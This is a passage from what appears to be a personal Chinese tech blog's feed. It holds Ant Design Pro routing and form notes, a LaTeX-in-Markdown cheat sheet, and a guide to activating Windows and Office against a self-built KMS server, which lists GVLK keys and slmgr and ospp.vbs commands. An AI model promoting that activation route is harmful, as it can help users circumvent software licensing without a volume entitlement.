class="string">&#x27;./user/AccountManage&#x27;</span>,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><h2 id="路由逻辑"><a class="markdownIt-Anchor" href="#路由逻辑"></a> 路由逻辑</h2><p>routes.js应该是一个自上而下的逐个适配过程，当找到能匹配的规则时就执行跳转，不再向下执行，所以通配符一定要放在最后面。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">  <span class="comment">//前面都不匹配，检查/</span></span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    redirect: <span class="string">&#x27;/index&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//所有的都没有匹配，跳转404</span></span><br><span class="line">  &#123;</span><br><span class="line">    component: <span class="string">&#x27;./404&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h1 id="手动操作表单内容"><a class="markdownIt-Anchor" href="#手动操作表单内容"></a> 手动操作表单内容</h1><p>  如果要取一个Form里面各项内容的值，需要创建一个formInstance，和form绑定之后就可以取值。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> ()=&gt;&#123;</span><br><span class="line">  <span class="keyword">const</span> [formRefofModal]=Form.useForm();   <span class="comment">//创建一个formInstance</span></span><br><span class="line">  ......</span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="comment">//在需要的地方通过formRef.current.getFieldsValue来取值</span></span><br><span class="line">      <span class="keyword">const</span> values=formRefofModal.getFieldsValue(<span class="literal">true</span>);</span><br><span class="line">      <span class="built_in">console</span>.log(values);</span><br><span class="line">      <span class="comment">//通过formRef.current.resetFields来快速重置表单项。</span></span><br><span class="line">      formRefofModal.resetFields();</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      ......</span><br><span class="line">        <span class="comment">// 通过form属性绑定到创建的ref</span></span><br><span class="line">         &lt;Form layout=<span class="string">&quot;vertical&quot;</span> hideRequiredMark form=&#123;formRefofModal&#125;&gt; </span><br><span class="line">            ......</span><br><span class="line">      ......</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//console输出的表单值</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;张三2222&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PhoneticDisplayName&quot;</span>: <span class="string">&quot;zhangsan3333&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sex&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Ethnicity&quot;</span>: <span class="string">&quot;汉族&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mobile&quot;</span>: <span class="string">&quot;123123123123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;123123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ChineseIDCard&quot;</span>: <span class="string">&quot;1231231&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="使用区块"><a class="markdownIt-Anchor" href="#使用区块"></a> 使用区块</h1><p>  AntDesign预先封装了一些组件模板，起名叫做<code>区块</code>，通过引入区块通过简单修改快速的实现页面。</p><p>  但是这个区块想用起来可真TM费事!!</p><p>  首先是官方文档里面对于区块的介绍。<br />  <a href="https://pro.ant.design/zh-CN/docs/assets/">https://pro.ant.design/zh-CN/docs/assets/</a><br />  光介绍了什么是区块，怎么用区块，但是没告诉你都有什么区块，也没给你链接。</p><p>  最后还是在github上面找到了全部的区块库。<br />  <a href="https://github.com/ant-design/pro-blocks">https://github.com/ant-design/pro-blocks</a></p><p>  随便点进去一个区块，readme里面写了个命令教你怎么安装。</p><p><img src="https://pic.lufer.cc/images/2021/08/03/image.png" alt="区块readme" /></p><p>  你以为你用这个命令能装上？Navie，直接给你一个报错，让你当场懵逼。</p><p><img src="https://pic.lufer.cc/images/2021/08/03/image380b55601b8c34b5.png" alt="报错" /></p><p>  最后搜到了一个issue，<a href="https://github.com/ant-design/ant-design-pro/issues/4534">https://github.com/ant-design/ant-design-pro/issues/4534</a></p><p>  这个issue下面有一个开发者说了一句话：</p><p><img src="https://pic.lufer.cc/images/2021/08/03/imagec6eeffa7aa285503.png" alt="开发者回复" /></p><p>  你以为你把命令改成<code>umi block add AccountSettings</code>就行了？Naive，会报跟先前一样的错。</p><p>  最后还是这个提问的人提供了一个解决办法。</p><blockquote><p>后续：经过测试，使用umi block add <a href="https://github.com/ant-design/pro-blocks/tree/master/UserLogin%E5%8F%AF%E4%BB%A5%E6%AD%A3%E5%B8%B8%E5%AE%89%E8%A3%85%E3%80%82">https://github.com/ant-design/pro-blocks/tree/master/UserLogin可以正常安装。</a></p></blockquote><p>  于是我把命令改成了<code>umi block add https://github.com/ant-design/pro-blocks/tree/master/AccountSettings</code>，安装成功。</p><p>安装成功之后页面起不来，控制台报错：<br /><img src="https://pic.lufer.cc/images/2021/08/03/image30e044d1c08dfac3.png" alt="缺少组件" /></p><p>  试图删掉node_modules重新<code>npm install</code>结果项目整个起不来了，最后还是特么重新建的项目，不想整这个区块了，还不如自己写。</p><p>  服了。</p><p>  未完待续，边填坑边记录。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  最近又在写前端了，掏出了祖传的AntD，发现已经更新到5.0版本了，而且通过umi安装的话是选不了老版本的。&lt;br /&gt;
  新版本怎么说呢，用起来真是坑坑洼洼的，而且官网文档写的一言难尽，有些东西他写了，但又没完全写，你看懂了，但又没完全看懂。&lt;br /&gt;
  记录一</summary>
      
    
    
    
    <category term="前端" scheme="https://coder.lufer.cc/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="前端" scheme="https://coder.lufer.cc/tags/%E5%89%8D%E7%AB%AF/"/>
    
    <category term="React" scheme="https://coder.lufer.cc/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>自建KMS激活Windows和Office</title>
    <link href="https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E8%87%AA%E5%BB%BAKMS%E6%BF%80%E6%B4%BBWindows%E5%92%8COffice/"/>
    <id>https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/%E8%87%AA%E5%BB%BAKMS%E6%BF%80%E6%B4%BBWindows%E5%92%8COffice/</id>
    <published>2021-04-22T01:43:56.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<p>  KMS在服务器可用的情况下会自动续期，只要不关闭KMS的服务或计划任务，所以并不需要180天手动激活一次。</p><h1 id="windows激活"><a class="markdownIt-Anchor" href="#windows激活"></a> Windows激活</h1><p>  下文提供了各个windows版本的GVLK秘钥，可以在安装系统时即输入该初始秘钥，也可安装后手动设置。</p><p>  激活方式:<br />  以管理员身份运行 Windows PowerShell或CMD，输入如下命令。</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#如果安装时即输入了初始秘钥，可以跳过前两步。</span><br><span class="line">slmgr /upk</span><br><span class="line"># 卸载当前产品密钥</span><br><span class="line">slmgr /ipk 秘钥序列号</span><br><span class="line"># 安装产品密钥 (参考下文 GVLK 密钥)</span><br><span class="line">slmgr /skms kms.xxxxx.com</span><br><span class="line"># 设置 KMS 服务器</span><br><span class="line">slmgr /ato</span><br><span class="line"># 立即激活</span><br><span class="line">slmgr /xpr</span><br><span class="line"># 查看激活剩余时间</span><br><span class="line">slmgr /dlv</span><br><span class="line"># 查看激活详细信息</span><br></pre></td></tr></table></figure><h2 id="windows-10"><a class="markdownIt-Anchor" href="#windows-10"></a> Windows 10</h2><table><thead><tr><th>操作系统版本</th><th>KMS 客户端安装程序密钥</th></tr></thead><tbody><tr><td>Windows 10 专业版</td><td>W269N-WFGWX-YVC9B-4J6C9-T83GX</td></tr><tr><td>Windows 10 专业版 N</td><td>MH37W-N47XK-V7XM9-C7227-GCQG9</td></tr><tr><td>Windows 10 专业工作站版</td><td>NRG8B-VKK3Q-CXVCJ-9G2XF-6Q84J</td></tr><tr><td>Windows 10 专业工作站版 N</td><td>9FNHH-K3HBT-3W4TD-6383H-6XYWF</td></tr><tr><td>Windows 10 专业教育版</td><td>6TP4R-GNPTD-KYYHQ-7B7DP-J447Y</td></tr><tr><td>Windows 10 专业教育版 N</td><td>YVWGF-BXNMC-HTQYQ-CPQ99-66QFC</td></tr><tr><td>Windows 10 教育版</td><td>NW6C2-QMPVW-D7KKK-3GKT6-VCFB2</td></tr><tr><td>Windows 10 教育版 N</td><td>2WH4N-8QGBV-H22JP-CT43Q-MDWWJ</td></tr><tr><td>Windows 10 企业版</td><td>NPPR9-FWDCX-D2C8J-H872K-2YT43</td></tr><tr><td>Windows 10 企业版 N</td><td>DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4</td></tr><tr><td>Windows 10 企业版 G</td><td>YYVX9-NTFWV-6MDM3-9PT4T-4M68B</td></tr><tr><td>Windows 10 企业版 G N</td><td>44RPN-FTY23-9VTTB-MP9BX-T84FV</td></tr><tr><td>Windows 10 企业版 LTSC 2019</td><td>M7XTQ-FN8P6-TTKYV-9D4CC-J462D</td></tr><tr><td>Windows 10 企业版 N LTSC 2019</td><td>92NFX-8DJQP-P6BBQ-THF9C-7CG2H</td></tr></tbody></table><h2 id="windows-7"><a class="markdownIt-Anchor" href="#windows-7"></a> Windows 7</h2><table><thead><tr><th>操作系统版本</th><th>KMS 客户端安装程序密钥</th></tr></thead><tbody><tr><td>Windows 7 专业版</td><td>FJ82H-XT6CR-J8D7P-XQJJ2-GPDD4</td></tr><tr><td>Windows 7 专业版 N</td><td>MRPKT-YTG23-K7D7T-X2JMM-QY7MG</td></tr><tr><td>Windows 7 专业版 E</td><td>W82YF-2Q76Y-63HXB-FGJG9-GF7QX</td></tr><tr><td>Windows 7 企业版</td><td>33PXH-7Y6KF-2VJC9-XBBR8-HVTHH</td></tr><tr><td>Windows 7 企业版 N</td><td>YDRBP-3D83W-TY26F-D46B2-XCKRJ</td></tr><tr><td>Windows 7 企业版 E</td><td>C29WB-22CC8-VJ326-GHFJW-H9DH4</td></tr></tbody></table><h2 id="windows-8"><a class="markdownIt-Anchor" href="#windows-8"></a> Windows 8</h2><table><thead><tr><th>操作系统版本</th><th>KMS 客户端安装程序密钥</th></tr></thead><tbody><tr><td>Windows 8.1 专业版</td><td>GCRJD-8NW9H-F2CDX-CCM8D-9D6T9</td></tr><tr><td>Windows 8.1 专业版 N</td><td>HMCNV-VVBFX-7HMBH-CTY9B-B4FXY</td></tr><tr><td>Windows 8.1 企业版</td><td>MHF9N-XY6XB-WVXMC-BTDCT-MKKG7</td></tr><tr><td>Windows 8.1 企业版 N</td><td>TT4HM-HN7YT-62K67-RGRQJ-JFFXW</td></tr><tr><td>Windows 8 专业版</td><td>NG4HW-VH26C-733KW-K6F98-J8CK4</td></tr><tr><td>Windows 8 专业版 N</td><td>XCVCF-2NXM9-723PB-MHCB7-2RYQQ</td></tr><tr><td>Windows 8 企业版</td><td>32JNW-9KQ84-P47T8-D8GGY-CWCK7</td></tr><tr><td>Windows 8 企业版 N</td><td>JMNMF-RHW7P-DMY6X-RF3DR-X2BQT</td></tr></tbody></table><h2 id="windows-server"><a class="markdownIt-Anchor" href="#windows-server"></a> Windows Server</h2><table><thead><tr><th>操作系统版本</th><th>KMS 客户端安装程序密钥</th></tr></thead><tbody><tr><td>Windows Server Datacenter</td><td>6NMRW-2C8FM-D24W7-TQWMY-CWH2D</td></tr><tr><td>Windows Server Standard</td><td>N2KJX-J94YW-TQVFB-DG9YT-724CC</td></tr><tr><td>Windows Server 2019 Datacenter</td><td>WMDGN-G9PQG-XVVXX-R3X43-63DFG</td></tr><tr><td>Windows Server 2019 Standard</td><td>N69G4-B89J2-4G8F4-WWYCC-J464C</td></tr><tr><td>Windows Server 2019 Essentials</td><td>WVDHN-86M7X-466P6-VHXV7-YY726</td></tr><tr><td>Windows Server 2016 Datacenter</td><td>CB7KF-BWN84-R7R2Y-793K2-8XDDG</td></tr><tr><td>Windows Server 2016 Standard</td><td>WC2BQ-8NRM3-FDDYY-2BFGV-KHKQY</td></tr><tr><td>Windows Server 2016 Essentials</td><td>JCKRF-N37P4-C2D82-9YXRT-4M63B</td></tr><tr><td>Windows Server 2012 R2 Server Standard</td><td>D2N9P-3P6X9-2R39C-7RTCD-MDVJX</td></tr><tr><td>Windows Server 2012 R2 Datacenter</td><td>W3GGN-FT8W3-Y4M27-J84CP-Q3VJ9</td></tr><tr><td>Windows Server 2012 R2 Essentials</td><td>KNC87-3J2TX-XB4WP-VCPJV-M4FWM</td></tr><tr><td>Windows Server 2012</td><td>BN3D2-R7TKB-3YPBD-8DRP2-27GG4</td></tr><tr><td>Windows Server 2012 N</td><td>8N2M2-HWPGY-7PGT9-HGDD8-GVGGY</td></tr><tr><td>Windows Server 2012 单语言版</td><td>2WN2H-YGCQR-KFX6K-CD6TF-84YXQ</td></tr><tr><td>Windows Server 2012 特定国家/地区版</td><td>4K36P-JN4VD-GDC6V-KDT89-DYFKP</td></tr><tr><td>Windows Server 2012 Server 标准版</td><td>XC9B7-NBPP2-83J2H-RHMBY-92BT4</td></tr><tr><td>Windows Server 2012 MultiPoint 标准版</td><td>HM7DN-YVMH3-46JC3-XYTG7-CYQJJ</td></tr><tr><td>Windows Server 2012 MultiPoint 高级版</td><td>XNH6W-2V9GX-RGJ4K-Y8X6F-QGJ2G</td></tr><tr><td>Windows Server 2012 Datacenter</td><td>48HP8-DN98B-MYWDG-T2DCC-8W83P</td></tr><tr><td>Windows Server 2008 R2 Web 版</td><td>6TPJF-RBVHG-WBW2R-86QPH-6RTM4</td></tr><tr><td>Windows Server 2008 R2 HPC 版</td><td>TT8MH-CG224-D3D7Q-498W2-9QCTX</td></tr><tr><td>Windows Server 2008 R2 标准版</td><td>YC6KT-GKW9T-YTKYR-T4X34-R7VHC</td></tr><tr><td>Windows Server 2008 R2 企业版</td><td>489J6-VHDMP-X63PK-3K798-CPX3Y</td></tr><tr><td>Windows Server 2008 R2 Datacenter</td><td>74YFP-3QFB3-KQT8W-PMXWJ-7M648</td></tr><tr><td>面向基于 Itanium 系统的 Windows Server 2008 R2</td><td>GT63C-RJFQ3-4GMB6-BRFB9-CB83V</td></tr><tr><td>Windows Web Server 2008</td><td>WYR28-R7TFJ-3X2YQ-YCY4H-M249D</td></tr><tr><td>Windows Server 2008 标准版</td><td>TM24T-X9RMF-VWXK6-X8JC9-BFGM2</td></tr><tr><td>不带 Hyper-V 的 Windows Server 2008 标准版</td><td>W7VD6-7JFBR-RX26B-YKQ3Y-6FFFJ</td></tr><tr><td>Windows Server 2008 企业版</td><td>YQGMW-MPWTJ-34KDK-48M3W-X4Q6V</td></tr><tr><td>不带 Hyper-V 的 Windows Server 2008 企业版</td><td>39BXF-X8Q23-P2WWT-38T2F-G3FPG</td></tr><tr><td>Windows Server 2008 HPC</td><td>RCTX3-KWVHP-BR6TB-RB6DM-6X7HP</td></tr><tr><td>Windows Server 2008 Datacenter</td><td>7M67G-PC374-GR742-YH8V4-TCBY3</td></tr><tr><td>不带 Hyper-V 的 Windows Server 2008 数据中心版</td><td>22XQ2-VRXRG-P8D42-K34TD-G3QQC</td></tr><tr><td>面向基于 Itanium 系统的 Windows Server 2008</td><td>4DWFP-JF3DJ-B7DTH-78FJB-PDRHK</td></tr></tbody></table><h1 id="office激活"><a class="markdownIt-Anchor" href="#office激活"></a> Office激活</h1><p>  使用KMS激活Office，需要安装<code>VOL（批量版）</code>版本。<br />  可以自行下载所需版本的VOL安装包，VOL会自带初始秘钥，无需手动填写。</p><p>  强烈推荐使用Office Tool Plus进行安装，同时更推荐用这个工具来卸载老版本的Office。<br />  <a href="https://otp.landian.vip/zh-cn/%E3%80%82">https://otp.landian.vip/zh-cn/。</a></p><h2 id="office-tool-plus激活"><a class="markdownIt-Anchor" href="#office-tool-plus激活"></a> Office Tool Plus激活</h2><p>  打开Office Tool Plus，进入部署功能，选择所需版本的批量授权版，进行安装，由于Office套装不带Visio，我这里还额外添加了Visio，选好之后点右上角“开始部署”即可。</p><p><img src="https://pic.lufer.cc/images/2021/04/22/image.png" alt="部署" /></p><p>  随后会进入自动安装过程。</p><p><img src="https://pic.lufer.cc/images/2021/04/22/image5b3b15c6e68d1379.png" alt="开始安装" /></p><p>返回首页，进入激活功能。</p><p><img src="https://pic.lufer.cc/images/2021/04/22/imagec0f74af727608cab.png" alt="激活界面" /></p><p>  展开许可证管理，选择刚才安装的产品，然后安装许可证。<br />  如果安装了其他产品，需要都安装许可证，例如我装了Visio，就还要在安装一次Visio的许可证。<br />  展开KMS管理，输入KMS主机地址，点击保存设置。<br />  最后点击右上角激活。</p><p>  成功激活。</p><p><img src="https://pic.lufer.cc/images/2021/04/22/imaged294b529ce92b2cf.png" alt="激活成功" /></p><h2 id="手动激活"><a class="markdownIt-Anchor" href="#手动激活"></a> 手动激活</h2><p>  以Office2016为例，查找 Office 安装目录，默认情况下 Office 2016 64 位版安装目录为<code>C:\Program Files\Microsoft Office\Office16</code>，其他版本请自行查找。<br />  以管理员身份运行 Windows PowerShell或CMD，输入如下命令。</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> &quot;C:\Program Files\Microsoft Office\Office16&quot;</span><br><span class="line"># 进入 Office 安装目录,请自行根据安装的 Office 版本修改目录.</span><br><span class="line">cscript ospp.vbs /dstatus</span><br><span class="line"># 查看当前激活状态,期限,版本,密钥等信息.安装 <span class="built_in">VOL</span> 版 Office 默认情况下已安装产品密钥.继续执行以下步骤激活.</span><br><span class="line">cscript ospp.vbs /sethst:kms.xxxxx.com</span><br><span class="line"># 设置 KMS 服务器</span><br><span class="line">cscript ospp.vbs /act</span><br><span class="line"># 立即激活</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  KMS在服务器可用的情况下会自动续期，只要不关闭KMS的服务或计划任务，所以并不需要180天手动激活一次。&lt;/p&gt;
&lt;h1 id=&quot;windows激活&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#windows激活&quot;&gt;&lt;/a&gt; Window</summary>
      
    
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title>Markdown中Latex语法</title>
    <link href="https://coder.lufer.cc/Hexo/Markdown%E4%B8%ADLatex%E8%AF%AD%E6%B3%95/"/>
    <id>https://coder.lufer.cc/Hexo/Markdown%E4%B8%ADLatex%E8%AF%AD%E6%B3%95/</id>
    <published>2021-04-17T02:12:06.000Z</published>
    <updated>2021-04-20T08:32:44.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="公式包裹方式"><a class="markdownIt-Anchor" href="#公式包裹方式"></a> 公式包裹方式</h1><p>  有两种方式来包裹公式内容：</p><ul><li>行内公式<br />  用<code>$</code>包裹公式</li><li>独立公式<br />  用<code>$$</code>包裹公式。</li></ul><p>  以下几个字符: <code># $ % &amp; ~ _ ^ \ &#123; &#125;</code>有特殊意义，需要表示这些字符时，需要转义。</p><h1 id="公式写法"><a class="markdownIt-Anchor" href="#公式写法"></a> 公式写法</h1><h2 id="占位符"><a class="markdownIt-Anchor" href="#占位符"></a> 占位符</h2><p>  两个quad空格，符号：<code>\qquad</code>，如：<code>x \qquad y</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mspace width="2em"/><mi>y</mi></mrow><annotation encoding="application/x-tex">x \qquad y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:2em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  quad空格，符号：<code>\quad</code>，如：<code>x \quad y</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mspace width="1em"/><mi>y</mi></mrow><annotation encoding="application/x-tex">x \quad y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  大空格，符号<code>\</code>，如：<code>x \ y</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mtext> </mtext><mi>y</mi></mrow><annotation encoding="application/x-tex">x \ y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  中空格，符号<code>\:</code>，如：<code>x \: y</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mtext> </mtext><mi>y</mi></mrow><annotation encoding="application/x-tex">x \: y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  小空格，符号<code>\,</code>，如：<code>x \, y</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mtext> </mtext><mi>y</mi></mrow><annotation encoding="application/x-tex">x \, y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  紧贴，符号<code>\!</code>，如：<code>x \! y</code>=&gt;  <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mtext> ⁣</mtext><mi>y</mi></mrow><annotation encoding="application/x-tex">x \! y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:-0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。</p><h2 id="上标-下标与组合"><a class="markdownIt-Anchor" href="#上标-下标与组合"></a> 上标、下标与组合</h2><p>  上标符号，符号：<code>^</code>，如：<code>x^4</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>4</mn></msup></mrow><annotation encoding="application/x-tex">x^4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span></span></span></span>。<br />  下标符号，符号：<code>_</code>，如：<code>x_1</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。<br />  组合符号，符号：<code>&#123;&#125;</code>，如：<code>&#123;16&#125;_&#123;8&#125;O&#123;2+&#125;_&#123;2&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mn>16</mn><mn>8</mn></msub><mi>O</mi><msub><mrow><mn>2</mn><mo>+</mo></mrow><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">{16}_{8}O{2+}_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord">1</span><span class="mord">6</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord"><span class="mord"><span class="mord">2</span><span class="mord">+</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。  ​</p><h2 id="基本运算"><a class="markdownIt-Anchor" href="#基本运算"></a> 基本运算</h2><p>  加法运算，符号：<code>+</code>，如：<code>x + y</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x + y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  减法运算，符号：<code>-</code>，如：<code>x - y</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>−</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x - y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  加减运算，符号：<code>\pm</code>，如：<code>x \pm y</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>±</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \pm y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">±</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  乘法运算，符号：<code>\times</code>，如：<code>x \times y</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>×</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \times y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  点乘运算，符号：<code>\cdot</code>，如：<code>x \cdot y</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>⋅</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \cdot y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  星乘运算，符号：<code>\ast</code>，如：<code>x \ast y</code>=&gt; <span class="katex"><span 